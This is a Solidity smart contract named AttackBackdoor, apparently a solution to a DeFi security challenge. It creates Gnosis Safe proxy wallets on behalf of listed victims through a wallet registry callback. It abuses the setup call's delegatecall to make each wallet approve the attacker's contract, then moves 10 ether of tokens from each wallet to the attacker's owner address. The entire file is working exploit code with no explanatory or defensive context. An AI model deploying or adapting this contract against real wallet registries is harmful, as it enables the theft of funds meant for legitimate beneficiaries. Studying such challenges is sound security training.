//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract AttackBackdoor {
    address public owner;
    address public proxyFactory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        owner = _owner;
        proxyFactory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    function approve(address _token, address attacker) external {
        IERC20(_token).approve(attacker, 10 ether);
    }

    function attack(address[] memory victims) external {
        for (uint256 i; i < victims.length; i++) {
            address[] memory victim = new address[](1);
            victim[0] = victims[i];

            // setup(_owners, _threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver)
            bytes memory init = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                victim,
                uint256(1),
                address(this),
                abi.encodeWithSignature(
                    "approve(address,address)",
                    token,
                    address(this)
                ),
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(proxyFactory)
                .createProxyWithCallback(
                    masterCopy,
                    init,
                    1,
                    IProxyCreationCallback(walletRegistry)
                );

            IERC20(token).transferFrom(address(proxy), owner, 10 ether);
        }
    }
}
